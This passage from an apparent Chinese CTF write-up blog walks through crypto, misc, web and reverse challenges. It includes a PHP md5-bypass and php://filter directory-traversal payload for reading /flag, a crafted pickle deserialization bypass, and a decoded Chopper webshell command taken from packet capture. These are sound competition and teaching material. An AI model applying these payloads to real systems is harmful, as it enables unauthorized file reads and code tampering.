class="number">13751833349374257546209411135285092025488474108950873335024549274321086737456294175321120539754112475192176856842163702158437261396059826784892899176923534179915888282864428402789707026830116675021571701648882970445289856088711084812757925707567230381940631064097247655097898810731114605714274641284534967275121251913986394408892187726203752249533094374744765243723455319272657285557501695073422223837888223589541537218910163081228251946239816318853757555291276404517545168694257378212616960758914005374587905274292014917325205163653897110709086078591016724234778570715311198272084303656971117931256882498414761066763</span></span><br><span class="line">    flag_decoded = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(flag_decoded))</span><br><span class="line">    </span><br><span class="line"><span class="comment">#b&#x27;flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;dP_4nd_dQ_1s_4_exc1tlng_pr0bLEm&#125;</code></p><p>​    </p><h3 id="FillTheBlank"><a href="#FillTheBlank" class="headerlink" title="FillTheBlank"></a>FillTheBlank</h3><blockquote><p>推公式？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">b = <span class="string">&quot;**********&quot;</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line">flag=<span class="string">&quot;flag&#123;*************&#125;&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">z = <span class="string">&quot;**********&quot;</span></span><br><span class="line"></span><br><span class="line">rb = gmpy2.invert(b, p)  <span class="comment">#p应为a</span></span><br><span class="line">rd = gmpy2.invert(d, p)  <span class="comment">#p应为a</span></span><br><span class="line"></span><br><span class="line">x = rb*rd</span><br><span class="line">c = (m + z * rb * d % a)%a</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(x==<span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span>)</span><br><span class="line"><span class="keyword">assert</span>(c == <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(d)/log(<span class="number">2</span>)&lt;=<span class="number">200</span>)</span><br><span class="line"><span class="keyword">assert</span>(log(z)/log(<span class="number">2</span>)&lt;=<span class="number">1024</span>)</span><br></pre></td></tr></table></figure></blockquote><p>推导：</p><p>由 $rb \equiv b^{-1} \pmod a$ 和 $rd \equiv d^{-1} \pmod a$ ，有 $rb \cdot b \cdot rd \cdot d = x \cdot b \cdot d \equiv 1 \pmod a$。</p><p>故求出 $b \equiv (x \cdot d)^{-1} \pmod a$，$rb \equiv b^{-1} \pmod a$。</p><p>又 $c = (m+z \cdot rb \cdot d) \bmod a$，构造格 $L=\begin{bmatrix} 1 &amp; rb \cdot d \\ 0 &amp; a \end{bmatrix}$，利用LLL算法求解：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">16358502146569154805821117102055792126075384391997576813810358118942744612520734385485210209088310766263140599554175000067735671573064419087690267925715334913530155481001158890983091873663077846204509925514040559562873128373049378251801304882824014436351821387973582562165652240535121822439156888350175610414618000437008389187928342072924670546637964062394868004556705496699646429981923137500855492623070913023804420063661041841121617920375160117028363526191248710373415720637387593795136212298387121644166224488964182846517612830649792045421886212347661276446680662471149305906153415890365792363053111611744767732723</span></span><br><span class="line">d = <span class="number">1004034638166310792730607806775703553124564601554345421260673</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">6315659043002030386732628047413448608037014021450055783529151485037069834363316696715574624507364755209361330204858147422873261866250183596759294051863367248800298182067900158706847792801508096127972864438349393635089442050383307416911012903769591812354414290225858817653700560363386018244490076357373032578412217266586094695255045411910123500620718125148007865650934761243821251725823364164494857358344030633984045814182753879152597382860304163779884435644346012876829684180445183686922253767338719485395107909704323571278192414797079570675523716981179479127876875936828316228191746093521584500893126198631718691478</span></span><br><span class="line">c = <span class="number">13596888613593355909989922489890598098147006404940300566769884949973269155719149670825677093684865700611084990815597885910353735947129944271345041538903031681298587672182524580124290627382140539264797169742520543929318842181890234622629255911624719400312152476306595541663238469772749767491911131691767357337344670678126067823905376191196367985379783363614691429132347967869598160549130755596368301366502209859435570988428790501722994265227987470237460083210385323943246674820772425514186206511159274330451656105100385024137631498256411854720506611702496670593426888793357086314109878603547497784715623917384308274129</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">b = gmpy2.invert(x*d,a)</span><br><span class="line">rb = gmpy2.invert(b,a)</span><br><span class="line">rd = gmpy2.invert(d,a)</span><br><span class="line">h = rb*d%a</span><br><span class="line"></span><br><span class="line">p = a</span><br><span class="line"></span><br><span class="line">v1 = vector(ZZ, [<span class="number">1</span>, h])</span><br><span class="line">v2 = vector(ZZ, [<span class="number">0</span>, p])</span><br><span class="line">m = matrix([v1,v2]);</span><br><span class="line">f, g = m.LLL()[<span class="number">0</span>]</span><br><span class="line">f, g = -f, -g</span><br><span class="line"><span class="comment">#print(f, g)</span></span><br><span class="line"></span><br><span class="line">a = f*c % p % g</span><br><span class="line">m = a * inverse_mod(f, g) % g</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;flag&#123;we1c0mE_t0_cr4aK_mE!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>FLAG:</strong> <code>flag&#123;we1c0mE_t0_cr4aK_mE!&#125;</code></p><p>​    </p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="checkin"><a href="#checkin" class="headerlink" title="checkin"></a>checkin</h3><blockquote><p>flag{W3Lc0m3_t0_2o2I_3n3rgy_contest}</p></blockquote><p>签到。</p><p><strong>FLAG:</strong> <code>flag&#123;W3Lc0m3_t0_2o2I_3n3rgy_contest&#125;</code></p><p>​    </p><h3 id="hardwire-1"><a href="#hardwire-1" class="headerlink" title="hardwire_1"></a>hardwire_1</h3><blockquote><p>下载附件压缩包，分析文件，找到flag。提交flag格式：flag{xxxx}。</p></blockquote><p>流量包文件，wireshark打开，追踪TCP流，发现菜刀连接流量特征。</p><p>解析流1中<code>z2</code>参数值，base64解码得：</p><p><code>cd /d &quot;C:\php\htdocs&quot;&amp;winrar a -pf@l#ag102 key.rar key.jpg&amp;echo [S]&amp;cd&amp;echo [E]</code></p><p>解析流3中<code>z0</code>参数值，base64解码转存得到Rar文件 <code>key.rar</code>。</p><p>结合前面的解压密码 <code>f@l#ag102</code>，解压得到 flag.jpg。</p><p><strong>FLAG:</strong> <code>flag&#123;579a4da9e3375c9b96add11cf2915eb5&#125;</code></p><p>​    </p><h3 id="wava"><a href="#wava" class="headerlink" title="wava"></a>wava</h3><blockquote><p>Do you know what is wava?</p></blockquote><p>附件move.zip无法打开，010editor查看为wav文件头，修改后缀，使用audacity打开未发现有用信息。</p><p>回到16进制下查看，发现在0x69处存在另一个wav文件头，删除前面的文件头保存，重新使用audacity打开，发现摩斯密码，手撸下来得到：</p><p><code>..-. .-.. .- --. ----- ....- -.. .---- -.. . -.... -.. -.... ...-- .- .- .---- -... ..... -... ..... ..... --... ...-- ..-. -.-. -.... . ----- ---.. . ...-- ----. -.... ..-. -----</code></p><p>解码得flag。</p><p><strong>FLAG:</strong> <code>flag&#123;04d1de6d63aa1b5b5573fc6e08e396f0&#125;</code></p><p>​    </p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h3><blockquote><p>想看二次元有很多障碍(flag在/flag)</p></blockquote><p>点提交按钮出现源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>])&#123; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">想看个二次元怎么这么难</span><br><span class="line">&lt;form action=<span class="string">&#x27;&#x27;</span> method=<span class="string">&#x27;GET&#x27;</span>&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;submit&#x27;</span> name=<span class="string">&#x27;submit&#x27;</span> /&gt; </span><br><span class="line">&lt;input type=<span class="string">&#x27;text&#x27;</span> name=<span class="string">&#x27;site&#x27;</span> style=<span class="string">&quot;width:1000px&quot;</span> value=<span class="string">&quot;https://bilibili.com/&quot;</span>/&gt; </span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt; </span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>]===<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])||(md5(<span class="variable">$_GET</span>[<span class="string">&#x27;user&#x27;</span>])!=md5(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]))) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;site&#x27;</span>]; </span><br><span class="line"><span class="variable">$path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line"><span class="variable">$url_schema</span> = parse_url(<span class="variable">$url</span>); </span><br><span class="line"><span class="variable">$host</span> = <span class="variable">$url_schema</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line"><span class="variable">$request_url</span> = <span class="variable">$url</span>.<span class="string">&quot;/v/popular/all&quot;</span>.<span class="variable">$path</span>; </span><br><span class="line"><span class="variable">$res</span> = file_get_contents(<span class="variable">$request_url</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strstr(<span class="variable">$res</span>,<span class="string">&quot;flag&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;you can&#x27;t see my flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$res</span>)&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Source Code:&lt;/h1&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$request_url</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;hr /&gt;&quot;</span>; </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$res</span>; </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;get source failed&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一层，PHP md5弱比较性质绕过：<code>user[]=1&amp;password[]=2</code></p><p>第二层，PHP伪协议拼接绕过关键词+目录穿越：<code>site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag</code></p><p>payload:</p><p><code>?submit=%E6%8F%90%E4%BA%A4&amp;site=php://filter/read=convert.base64-encode/resource=ss&amp;path=/../../../../../../../../../flag&amp;user[]=1&amp;password[]=2</code></p><p>得到<code>ZmxhZ3tqWkV0NkNrRmNSOFNHbVBCTjJobDVvcjBYVzRUM251TX0K</code>，base64解码得flag。</p><p><strong>FLAG:</strong> <code>flag&#123;jZEt6CkFcR8SGmPBN2hl5or0XW4T3nuM&#125;</code></p><p>​    </p><h3 id="EZpy"><a href="#EZpy" class="headerlink" title="EZpy"></a>EZpy</h3><blockquote><p>pickle反序列化</p></blockquote><p>加参数 <code>?source=1</code> 得到源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> b</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, render_template, request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">filename, encoding=<span class="string">&#x27;utf-8&#x27;</span></span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;r&#x27;</span>, encoding=encoding) <span class="keyword">as</span> fin:</span><br><span class="line">        <span class="keyword">return</span> fin.read()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="comment">#==判断</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span>(<span class="params">pickle.Unpickler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span>(<span class="params">self, module, name</span>):</span></span><br><span class="line">        <span class="keyword">if</span> module[<span class="number">0</span>:<span class="number">8</span>] == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">getattr</span>(sys.modules[<span class="string">&#x27;__main__&#x27;</span>], name)</span><br><span class="line">        <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;global &#x27;%s.%s&#x27; is forbidden&quot;</span> % (module, name))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">here_load</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;source&#x27;</span>):</span><br><span class="line">        <span class="keyword">return</span> Response(read(__file__),mimetype=<span class="string">&#x27;text/plain&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(<span class="string">&quot;/?source=&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/app&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inll</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            pickle_data = request.form.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> base64.b64decode(pickle_data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&#x27;no no no&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                result = here_load(base64.b64decode(pickle_data))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">type</span>(result) <span class="keyword">is</span> <span class="keyword">not</span> people:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&#x27;？？？？&#x27;</span></span><br><span class="line">            correct = (result == people(b.name, b.sex, b.age))</span><br><span class="line">            <span class="keyword">if</span> correct:</span><br><span class="line">                <span class="keyword">return</span> Response(read(<span class="string">&#x27;/flag.txt&#x27;</span>))</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> Response(<span class="built_in">str</span>(e))</span><br><span class="line"></span><br><span class="line">    test = people(<span class="string">&#x27;test&#x27;</span>, <span class="string">&#x27;test&#x27;</span>,<span class="string">&#x27;55&#x27;</span>)</span><br><span class="line">    pickle_data = base64.b64encode(pickle.dumps(test)).decode()</span><br><span class="line">    <span class="keyword">return</span> Response(pickle_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>限制中，改写了<code>find_class</code>函数，只能生成<code>__main__</code>模块的pickle，此外，禁止了<code>b&#39;R&#39;</code>。</p><p>目标是覆盖 <code>b</code> 中的验证，由于 <code>b</code> 被主程序引入，是存在于<code>__main__</code>下的 <code>b</code> 模块中的，所以可以直接覆盖掉，此时就成功绕过了限制：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">people</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, sex, age</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.sex = sex</span><br><span class="line">        self.age=age</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;people(name=<span class="subst">&#123;self.name!r&#125;</span>, category=<span class="subst">&#123;self.sex!r&#125;</span>, age=<span class="subst">&#123;self.age!r&#125;</span>)&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__eq__</span>(<span class="params">self, other</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">type</span>(other) <span class="keyword">is</span>  people <span class="keyword">and</span> self.name == other.name <span class="keyword">and</span> self.sex == other.sex <span class="keyword">and</span> self.age==other.age</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(pickle.dumps(people(&#x27;aaa&#x27;,&#x27;bbb&#x27;,&#x27;ccc&#x27;)))</span></span><br><span class="line"></span><br><span class="line">data=<span class="string">b&#x27;&#x27;&#x27;c__main__</span></span><br><span class="line"><span class="string">b</span></span><br><span class="line"><span class="string">(S&#x27;name&#x27;</span></span><br><span class="line"><span class="string">S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;sex&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;age&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">db0(S&quot;aaa&quot;</span></span><br><span class="line"><span class="string">S&quot;bbb&quot;</span></span><br><span class="line"><span class="string">S&quot;ccc&quot;</span></span><br><span class="line"><span class="string">i__main__</span></span><br><span class="line"><span class="string">people</span></span><br><span class="line"><span class="string">.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(data).decode())</span><br><span class="line"></span><br><span class="line"><span class="comment">#Y19fbWFpbl9fCmIKKFMnbmFtZScKUyJhYWEiClMic2V4IgpTImJiYiIKUyJhZ2UiClMiY2NjIgpkYjAoUyJhYWEiClMiYmJiIgpTImNjYyIKaV9fbWFpbl9fCnBlb3BsZQou</span></span><br></pre></td></tr></table></figure><p>POST方式在 <code>/app</code> 路由传入参数 <code>data</code>，得到flag。</p><p><strong>FLAG:</strong> <code>flag&#123;2Vl49keFDTMN3frBo6HOYw0djCGzIcPQ&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;能源网络安全是国家实施能源安全战略的重要保障。在国家“碳达峰、碳中和”战略目标引领下，以新能源为主体的新型电力系统正加快建设，能源企业数字化转型加速发展，我国能源网络安全风险挑战仍将持续增大。为深入贯彻习近平总书记关于切实做好国家关键信息基础设施安</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2021羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2021/09/12/match-2021%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2021-09-11T17:14:50.000Z</published>
    <updated>2021-09-11T19:04:16.364Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>大赛由中共广州市委网络安全和信息化委员会办公室作为指导单位，广州市网络安全产业促进会主办，广东外语外贸大学、深信服科技股份有限公司承办，广州市信息安全测评中心、广州互联网协会协办。</p><p>大赛以“网络安全为人民、网络安全靠人民”为主题，旨在通过竞赛的方式提高参赛选手攻防兼备的网络安全实践技能，实现以赛促学、以赛会友，加强不同院校及单位间的技术交流。</p><p>Rank: 企事业单位组12</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="Ez-android"><a href="#Ez-android" class="headerlink" title="Ez_android"></a>Ez_android</h3><blockquote><p>Just an easy sign in!</p></blockquote><p>jadx查看<code>MainActivity</code>类。</p><p><code>onClink</code>函数先验证username和password，在资源文件查到username为<code>admin</code>，加密处理后的password值为<code>c232666f1410b3f5010dc51cec341f58</code>，又<code>getEncodeStr</code>函数对password的md5结果每一byte做了减1处理，还原得到<code>c33367701511b4f6020ec61ded352059</code>，查到对应的原值为<code>654321</code>。</p><p>接下来执行<code>getKeyAndRedirect</code>函数，传入password值<code>654321</code>，进入socket交互（<code>nc 139.224.191.201 20080</code>），输入password，拿到key字符串：</p><p>key=<code>TGtUnkaJD0frq61uCQYw3-FxMiRvNOB/EWjgVcpKSzbs8yHZ257X9LldIeh4APom</code></p><p>在<code>getKeyAndRedirect</code>函数中最后将key传递到<code>CheckFlagActivity</code>，在<code>CheckFlagActivity</code>中<code>checkFlag</code>函数调用<code>EncodeUtils</code>类实现base64编码，key为码表，encodeFlag为编码结果：</p><p>encodeFlag=<code>3lkHi9iZNK87qw0p6U391t92qlC5rwn5iFqyMFDl1t92qUnL6FQjqln76l-P</code></p><p>跑更换码表base64解码算法还原flag：SangFor{212f4548-03d1-11ec-ab68-00155db3a27e}</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="BabyRop"><a href="#BabyRop" class="headerlink" 